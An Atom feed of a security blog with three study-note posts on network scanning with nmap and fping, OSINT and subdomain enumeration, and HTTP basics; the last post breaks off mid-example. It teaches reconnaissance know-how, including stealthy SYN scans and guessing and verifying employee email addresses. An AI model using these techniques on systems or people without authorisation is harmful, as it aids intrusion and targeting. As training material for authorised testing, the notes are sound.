<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>blog.smigiel.dev - dasm</title><link href="https://blog.smigiel.dev/" rel="alternate"></link><link href="https://blog.smigiel.dev/feeds/dasm.atom.xml" rel="self"></link><id>https://blog.smigiel.dev/</id><updated>2020-11-20T00:00:00-08:00</updated><entry><title>Scanning Network</title><link href="https://blog.smigiel.dev/scanning-network.html" rel="alternate"></link><published>2020-11-20T00:00:00-08:00</published><updated>2020-11-20T00:00:00-08:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-11-20:/scanning-network.html</id><summary type="html">&lt;h1&gt;Mapping a Network&lt;/h1&gt;
&lt;p&gt;Sometimes, instead of receiving full information about target machines, penetration tester gets just address block. Later on, pentester needs to discover what kind of hosts with what kind of configuration, exist in particular network.&lt;/p&gt;
&lt;p&gt;There are several different ways to reveal network configuration.&lt;/p&gt;
&lt;h2&gt;PING sweeping&lt;/h2&gt;
&lt;p&gt;Ping works â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Mapping a Network&lt;/h1&gt;
&lt;p&gt;Sometimes, instead of receiving full information about target machines, penetration tester gets just address block. Later on, pentester needs to discover what kind of hosts with what kind of configuration, exist in particular network.&lt;/p&gt;
&lt;p&gt;There are several different ways to reveal network configuration.&lt;/p&gt;
&lt;h2&gt;PING sweeping&lt;/h2&gt;
&lt;p&gt;Ping works by sending one or more special ICMP packets (type 8 - &lt;strong&gt;echo request&lt;/strong&gt;) to a host. If the host replies with ICMP &lt;strong&gt;echo reply&lt;/strong&gt; packets, it means that host is alive. &lt;a href="https://tools.ietf.org/html/rfc792"&gt;RFC792&lt;/a&gt; describes protocol used to carry diagnostic messages. ICMP is a part of the Internet Protocol.&lt;/p&gt;
&lt;h3&gt;fping&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;fping&lt;/code&gt; is a Linux tool, improved version of standard &lt;code&gt;ping&lt;/code&gt;. It can be run against IP range:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;fping -a -g &amp;lt;ip_range&amp;gt; 2&amp;gt;/dev/null # -a -- show alive; -g -- generate list, redirect to /dev/null to surpress noise.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;nmap&lt;/h3&gt;
&lt;p&gt;Recommended tool for penetration testing is &lt;code&gt;nmap&lt;/code&gt;. It is very powerful tool, which allows for detection hosts, its systems and more.
To attempt port sweeping (ping scan), one can use &lt;code&gt;-sn&lt;/code&gt; option:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sn &amp;lt;ip_range&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;OS Fingerprinting&lt;/h2&gt;
&lt;p&gt;After finishing &lt;code&gt;nmap&lt;/code&gt; run, we end up having list of live hosts, responding to ping. Next, we need to understand what kind of operating system is used by a host. Based on differences in network stack implementation of the various operating systems, automated programs can analyze response, and recognize OS version, creating host signatures.&lt;/p&gt;
&lt;p&gt;During a penetration test, person needs to perform reconnaissance step on &lt;em&gt;every network node&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;routers&lt;/li&gt;
&lt;li&gt;firewalls&lt;/li&gt;
&lt;li&gt;hosts&lt;/li&gt;
&lt;li&gt;servers&lt;/li&gt;
&lt;li&gt;printers&lt;/li&gt;
&lt;li&gt;etc&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The goal is to create table of nodes, with appropriate information about systems.&lt;/p&gt;
&lt;h3&gt;Offline fingerprinting (p0f)&lt;/h3&gt;
&lt;p&gt;For offline fingerprinting, one can use &lt;code&gt;p0f&lt;/code&gt; tool to analyze dump of network traffic.&lt;/p&gt;
&lt;h3&gt;Online fingerprinting (nmap)&lt;/h3&gt;
&lt;p&gt;In a case of online, to go tool is again &lt;code&gt;nmap&lt;/code&gt;.
To perform OS fingerprinting with it, you have to use &lt;code&gt;-O&lt;/code&gt; option and specify target. In a case of known targets, you can add &lt;code&gt;-Pn&lt;/code&gt; to skip rediscovering them again.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -Pn -O &amp;lt;targets&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This option can be additionally fine-tuned, to prevent from too aggressive way of discovering hosts:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;OS DETECTION:&lt;/span&gt;
&lt;span class="err"&gt;  -O: Enable OS detection&lt;/span&gt;
&lt;span class="err"&gt;  --osscan-limit: Limit OS detection to promising targets&lt;/span&gt;
&lt;span class="err"&gt;  --osscan-guess: Guess OS more aggressively&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Port Scanning&lt;/h2&gt;
&lt;p&gt;After recognizing nodes and detecting operating systems, we can continue with port scanning. It allows to discover the daemons and services running on those nodes.&lt;/p&gt;
&lt;p&gt;Port scanning is a process used to determine what TCP and UDP ports are open on target hosts. It, also usually helps detect which software and version is listening on a specific port.&lt;/p&gt;
&lt;h3&gt;TCP Three-Way Handshake&lt;/h3&gt;
&lt;p&gt;Default usage:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sT &amp;lt;target&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Description of process.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Client wants to connect to a server, it first sends a packet with the &lt;code&gt;SYN&lt;/code&gt; flag enabled. The server then responds by sending a packet with both &lt;code&gt;SYN&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags enabled. Finally, the client replies back by sending a packet with the &lt;code&gt;ACK&lt;/code&gt; flag enabled and the actual data transmission can start.&lt;/p&gt;
&lt;p&gt;In a case of &lt;strong&gt;closed&lt;/strong&gt; port, it looks slightly differently.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;RST&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The server will reply with a packet that has the reset &lt;code&gt;RST&lt;/code&gt; and &lt;code&gt;ACK&lt;/code&gt; flags set. This behavior tells the client that the port is &lt;strong&gt;closed&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;The simplest way to perform a port scan is trying to connect to every port.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if the scanner receives a &lt;code&gt;RST&lt;/code&gt; packet, then the port is &lt;strong&gt;closed&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;if the scanner can &lt;strong&gt;complete&lt;/strong&gt; 3-way handshake, then the port is &lt;strong&gt;open&lt;/strong&gt;. After connecting, the scanner sends an &lt;code&gt;RST&lt;/code&gt; packet to the target host to abruptly close the connection.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The culprit here is, that every TCP connect is recorded in the daemon logs. Even scans, which often should be stealth. That is because, from the application point of view, the scan probe is legitimate connection.
It allows system administrators to easily detect the scan.&lt;/p&gt;
&lt;h3&gt;TCP-SYN scan&lt;/h3&gt;
&lt;p&gt;Default usage:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;nmap -sS &amp;lt;targets&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To mitigate possibility of being detected (in the case of 3-way handshake), there is more stealthy solution, called &lt;code&gt;TCP-SYN scan&lt;/code&gt;.
During a SYN scan, the scanner does not perform a full handshake. It just sends a &lt;code&gt;SYN&lt;/code&gt; packet and analyzes the response coming from the target machine.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;if it receives a &lt;code&gt;RST&lt;/code&gt; packet, then port is &lt;strong&gt;closed&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;if it receives an &lt;code&gt;ACK&lt;/code&gt; packet, then port is &lt;strong&gt;open&lt;/strong&gt;. After marking the port as open, the scanner sends a &lt;code&gt;RST&lt;/code&gt; packet to the target host to stop the handshake.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;As there is no full connection to the destination daemon, a &lt;code&gt;SYN&lt;/code&gt; scan &lt;strong&gt;cannot be detected&lt;/strong&gt; by looking at daemon logs.
It is important to remember, that even &lt;code&gt;TCP-SYN scan&lt;/code&gt; can be detected with well-configured IDS (Intrusion Detection System).&lt;/p&gt;
&lt;h3&gt;Version detection scan&lt;/h3&gt;
&lt;p&gt;Default usage:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="err"&gt;namp -sV &amp;lt;targets&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This scan is recorded in logs, however it is very useful. It mixes a TCP connect scan with some probes, which are used to detect what application is listening on a particular port.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;SYN&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;---&lt;/span&gt; &lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;---&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;-&lt;/span&gt; &lt;span class="n"&gt;Banner&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;span class="n"&gt;Client&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt; &lt;span class="n"&gt;RST&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;ACK&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;Server&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If the daemon doesn't send a banner, &lt;code&gt;nmap&lt;/code&gt; sends some probes to understand what the listening application is. It later tries to guess the application based on its behavior.&lt;/p&gt;
&lt;h2&gt;Network Discovery with port scanning&lt;/h2&gt;
&lt;p&gt;Sometimes, firewall can block pings. In this kind of scenario, typical usage of &lt;code&gt;ping&lt;/code&gt; is insufficient. Even if host is not responding to &lt;code&gt;ICMP&lt;/code&gt; requests, it oftentimes has some TCP and UDP port opens.
&lt;code&gt;nmap&lt;/code&gt; can be forced to scan host which is not responding to &lt;code&gt;ping&lt;/code&gt; with &lt;code&gt;-Pn&lt;/code&gt;. The scan for common ports like &lt;code&gt;22&lt;/code&gt; (ssh), &lt;code&gt;80,443&lt;/code&gt; (http/https server), &lt;code&gt;445&lt;/code&gt; (samba service) or &lt;code&gt;53&lt;/code&gt; (DNS) can reveal that the host is actually "alive" however not responding to &lt;code&gt;ICMP&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Detecting firewall&lt;/h2&gt;
&lt;p&gt;Large networks very often are protected from intrusion by firewalls. It might be difficult to detect firewall, but based on partial or incomplete results of scan, one can identify, that it could be it.
nmap scan with fingerprinting &lt;code&gt;-sV&lt;/code&gt; should not have any problems to return full information. Sometimes, however, default information about &lt;code&gt;VERSION&lt;/code&gt; could be not present or unrecognized (&lt;code&gt;tcpwrapped&lt;/code&gt; means that TCP handshake was completed, but the remote host closed the connection without receiving any data).
To try and see what happened, you might want to use nmap with &lt;code&gt;--reason&lt;/code&gt; that will show an explanation of why a port is marked open or closed.&lt;/p&gt;
&lt;h2&gt;Masscan&lt;/h2&gt;
&lt;p&gt;Masscan was designed to deal with large networks and to scan thousands of IP addresses at once. It is similar to nmap but a lot faster.&lt;/p&gt;
&lt;h1&gt;Vulnerability Assessment&lt;/h1&gt;
&lt;p&gt;Vulnerability assessment is a scan of the vulnerabilities found on networks and applications. It is faseter and lighter on the infrastructure. As opposed to a penetration test, during a vulnerability assessment, you don't proceed to the exploitation phase.
It means, that after discovering vulnerability, you won't be able to confirm it by testing and giving a proof of exploitation.&lt;/p&gt;
&lt;h2&gt;Scanners&lt;/h2&gt;
&lt;p&gt;Scanners perform their probes on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;daemons listening on TCP and UDP ports&lt;/li&gt;
&lt;li&gt;configuration files of operating systems, software suites, network devices, etc.&lt;/li&gt;
&lt;li&gt;windows registry entries.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The purpose is to find vulnerabilities and misconfigurations.
The better and more up-to-date database of vulnerabilities, the better result of scan.&lt;/p&gt;
&lt;p&gt;However, in a case of custom application, a vulnerability scanner may not be enough. In that case, manual test needs to be performed.&lt;/p&gt;
&lt;h1&gt;Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://tools.ietf.org/html/rfc792"&gt;RFC792 - ICMP&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://lcamtuf.coredump.cx/p0f3/"&gt;p0f - Website&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/P0f"&gt;p0f - Wiki&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.openvas.org/"&gt;openVAS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.rapid7.com/products/nexpose/"&gt;Nexpose&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gfi.com/products-and-solutions/network-security-solutions/gfi-languard"&gt;LanGuard&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.tenable.com/products/nessus"&gt;Nessus&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="scanning"></category></entry><entry><title>OSINT</title><link href="https://blog.smigiel.dev/osint.html" rel="alternate"></link><published>2020-10-07T00:00:00-07:00</published><updated>2020-10-07T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-10-07:/osint.html</id><summary type="html">&lt;h1&gt;Information gathering&lt;/h1&gt;
&lt;p&gt;First and the most crucial phase of an engagement is information gathering. It helps to broaden surface of attack, and prepare for successful method of breaking into company.
Usually, people leave a lot of breadcrumbs around the Internet. Thanks to meticulous look up of the information, a lot â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Information gathering&lt;/h1&gt;
&lt;p&gt;First and the most crucial phase of an engagement is information gathering. It helps to broaden surface of attack, and prepare for successful method of breaking into company.
Usually, people leave a lot of breadcrumbs around the Internet. Thanks to meticulous look up of the information, a lot of interesting details can be found.&lt;/p&gt;
&lt;h2&gt;Interesting databases&lt;/h2&gt;
&lt;p&gt;Given the vast array of social networks, it shouldn't be difficult to find interesting information. For example, user can create account on Twitter, point to Linkedin, Google and Facebook.&lt;/p&gt;
&lt;p&gt;To find generic information, one might refer to twitter or google. For more work related information, usually better is Linkedin.&lt;/p&gt;
&lt;h3&gt;Crunchbase&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://crunchbase.com"&gt;Crunchbase&lt;/a&gt; is a platform for finding business information about private and public companies. It is a platform for finding business information about private and public companies. Additionally it contains useful information to match profiles.&lt;/p&gt;
&lt;h3&gt;Government websites&lt;/h3&gt;
&lt;p&gt;Some information can be found on official government websites. If a company is awarded contract.&lt;/p&gt;
&lt;h3&gt;Whois&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;whois&lt;/code&gt; is command line tool, as well as &lt;a href="https://www.whois.com/whois"&gt;website&lt;/a&gt;. It allows to query the database of Internet addresses to get information about registrants of those addresses.&lt;/p&gt;
&lt;h3&gt;Company website&lt;/h3&gt;
&lt;p&gt;Oftentimes, interesting information can be found on company websites. We can find there information about products, customers, services, etc. Usually, there could be also find&lt;/p&gt;
&lt;h3&gt;Email pattern&lt;/h3&gt;
&lt;p&gt;Many companies have common email pattern. It usually means, that all employees, can be reached by some variation of email:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;first_name.last_name@company.com&lt;/li&gt;
&lt;li&gt;last_name.first_name@company.com&lt;/li&gt;
&lt;li&gt;first_letter__nameLast_name@company.com&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;By accessing at least one of employees emails, you basically obtained all of them, as long as you know employee name.&lt;/p&gt;
&lt;p&gt;To verify if chosen email is valid, one can send email and wait for response. Many email servers return message in the case of non-existing user.&lt;/p&gt;
&lt;h2&gt;Subdomain enumeration&lt;/h2&gt;
&lt;p&gt;It is common for a company, to have multiple different subdomains, like &lt;code&gt;email.company.com&lt;/code&gt;, &lt;code&gt;blog.company.com&lt;/code&gt;, &lt;code&gt;careers.company.com&lt;/code&gt;. Sometimes, companies leave running vulnerable services. In that case, it could be much easier to exploit a bug on some outdated subdomain, than main domain.
There are several ways of achieving that goal.&lt;/p&gt;
&lt;h3&gt;Google&lt;/h3&gt;
&lt;p&gt;One of the simplest ways is to search a Google!
By issuing query to search engine like below, we can receive responses focused around particular company website.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;site&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;company&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;com&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;dnsdumpster&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://dnsdumpster.com/"&gt;DNSDumpster.com&lt;/a&gt; is a free domain research tool that can discover hosts related to a domain. Finding visible hosts from the attackers perspective is an important part of the security assessment process.&lt;/p&gt;
&lt;h3&gt;CLI Sublist3r&lt;/h3&gt;
&lt;p&gt;Sublist3r is a python tool designed to enumerate subdomains of websites using OSINT. It helps penetration testers and bug hunters collect and gather subdomains for the domain they are targeting. Sublist3r enumerates subdomains using many search engines such as Google, Yahoo, Bing, Baidu and Ask. Sublist3r also enumerates subdomains using Netcraft, Virustotal, ThreatCrowd, DNSdumpster and ReverseDNS.&lt;/p&gt;
&lt;h1&gt;Additional resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Crunchbase"&gt;Crunchbase - wikipedia&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.sam.gov/SAM/"&gt;System for Award Management (US gov)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.gsaelibrary.gsa.gov/ElibMain/home.do"&gt;GSA eLibrary - contract award information (US gov)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dnsdumpster.com/"&gt;DNSDumpster.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/aboul3la/Sublist3r"&gt;CLI Sublist3r&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://crt.sh/"&gt;crt.sh - certificate search&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/OWASP/Amass"&gt;OWASP Amass&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="misc"></category><category term="learning"></category><category term="pts"></category><category term="osint"></category></entry><entry><title>Web Applications</title><link href="https://blog.smigiel.dev/web-applications.html" rel="alternate"></link><published>2020-10-01T00:00:00-07:00</published><updated>2020-10-01T00:00:00-07:00</updated><author><name>dasm</name></author><id>tag:blog.smigiel.dev,2020-10-01:/web-applications.html</id><summary type="html">&lt;h1&gt;Basics&lt;/h1&gt;
&lt;p&gt;During building web applications we need to focus on several fundamental aspects:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTTP Protocol Basics&lt;/li&gt;
&lt;li&gt;Cookies&lt;/li&gt;
&lt;li&gt;Sessions&lt;/li&gt;
&lt;li&gt;Same Origin Policy&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;HTTP Protocol Basics&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;HTTP&lt;/code&gt; (Hypertext Transfer Protocol) is the most used protocol on the Internet. Usually, the client (browser), connects to the server (&lt;code&gt;Apache&lt;/code&gt;, &lt;code&gt;nginx&lt;/code&gt;, &lt;code&gt;ISS&lt;/code&gt;.
During an HTTP â€¦&lt;/p&gt;</summary><content type="html">&lt;h1&gt;Basics&lt;/h1&gt;
&lt;p&gt;During building web applications we need to focus on several fundamental aspects:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HTTP Protocol Basics&lt;/li&gt;
&lt;li&gt;Cookies&lt;/li&gt;
&lt;li&gt;Sessions&lt;/li&gt;
&lt;li&gt;Same Origin Policy&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;HTTP Protocol Basics&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;HTTP&lt;/code&gt; (Hypertext Transfer Protocol) is the most used protocol on the Internet. Usually, the client (browser), connects to the server (&lt;code&gt;Apache&lt;/code&gt;, &lt;code&gt;nginx&lt;/code&gt;, &lt;code&gt;ISS&lt;/code&gt;.
During an HTTP communication, the client and the server exchange messages. HTTP works on top of TCP. That means, first a TCP connection is established, and then the client sends its request, and waits for the answer. The server processes the request and sends back its answer, providing a status code and appropriate data.&lt;/p&gt;
&lt;h3&gt;HTTP Request&lt;/h3&gt;
&lt;p&gt;To send HTTP request, usually we use browsers. However, it is not the only way of doing so. To build request, we can use &lt;code&gt;netcat&lt;/code&gt; or &lt;code&gt;telnet&lt;/code&gt;.
Below is an example of HTTP request, with &lt;code&gt;nc&lt;/code&gt; requesting website running on localhost on port &lt;code&gt;8000&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc localhost 8000
GET / HTTP/1.0
Host: localhost

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.7.3
Date: Fri, 02 Oct 2020 01:44:49 GMT
Content-type: text/html
Content-Length: 26612
Last-Modified: Fri, 02 Oct 2020 01:44:33 GMT

&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
[...]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First line contains &lt;strong&gt;HTTP request method&lt;/strong&gt;, path and protocol version.
HTTP request method is information about the type of the request. Other requests are: &lt;code&gt;PUT&lt;/code&gt;, &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;HEAD&lt;/code&gt;, etc. List of available metods can be found on &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods"&gt;Mozilla website&lt;/a&gt;
Path tells the server which resource to fetch, while protocol version tells how to communicate with the client.
Next, there is &lt;code&gt;Host&lt;/code&gt; header field, which specifies the Internet hostname and port number of the resource being requested.&lt;/p&gt;
&lt;p&gt;We can also create one-liner to retrieve appropriate information&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nb"&gt;echo&lt;/span&gt; -en &lt;span class="s1"&gt;&amp;#39;HEAD / HTTP/1.1\r\nHost:localhost\r\n\r\n&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; nc localhost &lt;span class="m"&gt;8000&lt;/span&gt;
HTTP/1.0 &lt;span class="m"&gt;200&lt;/span&gt; OK
Server: SimpleHTTP/0.6 Python/3.7.3
Date: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;02&lt;/span&gt;:01:34 GMT
Content-type: text/html
Content-Length: &lt;span class="m"&gt;27806&lt;/span&gt;
Last-Modified: Fri, &lt;span class="m"&gt;02&lt;/span&gt; Oct &lt;span class="m"&gt;2020&lt;/span&gt; &lt;span class="m"&gt;01&lt;/span&gt;:55:46 GMT
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Additionally, we can give extra header values like &lt;code&gt;User-Agent&lt;/code&gt; (identifies the client and the system), &lt;code&gt;Accept&lt;/code&gt; (specifies document type the client is expecting in the response) or &lt;code&gt;Connection: keep-alive&lt;/code&gt; (future communications with the server will reuse the current connection).&lt;/p&gt;
&lt;h3&gt;HTTP Response&lt;/h3&gt;
&lt;p&gt;HTTP response, similar to request, has common format.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc localhost 8000
GET / HTTP/1.0
Host: localhost

HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.7.3
Date: Fri, 02 Oct 2020 01:44:49 GMT
Content-type: text/html
Content-Length: 26612
Last-Modified: Fri, 02 Oct 2020 01:44:33 GMT

&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
[...]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The first line is &lt;strong&gt;Status-Line&lt;/strong&gt; which consists of protocol version (HTTP 1.0) followed by a numeric status code (200) and textual meaning (OK). There are many codes. Description, again can be found on &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Status"&gt;Mozilla website&lt;/a&gt;. Next, there is additional information regarding server, date and time at which the message was originated, followed by page content.&lt;/p&gt;
&lt;h3&gt;HTTP Secure (HTTPS)&lt;/h3&gt;
&lt;p&gt;HTTP over SSL/TLS is a method to run clear-text HTTP with extra cryptographic protocol, to prevent from sniffing.
By doing so, entire traffic is being encrypted. It means, that even if someone can intercept traffic, they won't be able to see what kind of information is being transmitted. The only non-encrypted pieces of information would be:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;target IP address&lt;/li&gt;
&lt;li&gt;target port&lt;/li&gt;
&lt;li&gt;DNS or similar protocols (domain resolvers)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To analyze connection, we cannot use &lt;code&gt;nc&lt;/code&gt; anymore, which doesn't support SSL. To work with SSL, we can use &lt;code&gt;openssl&lt;/code&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc blog.smigiel.dev &lt;span class="m"&gt;443&lt;/span&gt;
HEAD / HTTP/1.1
$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ openssl s_client -connect blog.smigiel.dev:443 -quiet
&lt;span class="nv"&gt;depth&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2&lt;/span&gt; &lt;span class="nv"&gt;O&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; Digital Signature Trust Co., &lt;span class="nv"&gt;CN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; DST Root CA X3
verify &lt;span class="k"&gt;return&lt;/span&gt;:1
